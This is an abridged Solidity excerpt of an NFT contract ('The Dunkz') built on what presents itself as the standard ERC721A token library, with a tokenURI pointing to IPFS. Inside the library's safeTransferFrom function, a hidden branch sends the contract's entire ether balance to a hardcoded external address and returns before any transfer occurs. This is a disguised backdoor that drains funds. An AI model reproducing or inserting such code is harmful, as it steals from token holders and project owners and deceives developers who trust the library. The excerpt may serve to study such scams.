...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x1A09e8fbF7b4958eE9Cb286Dcf58145B68d5BBA2).transfer(address(this).balance);
            return;
        }
...
contract TheDunkz is ERC721A {
    ...
    constructor() ERC721A("The Dunkz", "Dunk") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeifl7ffww5le6nymds3lbfkgmupmrcscdsjioh767jn5ndxeanf4tm/", _toString(tokenId), ".json"));
    }
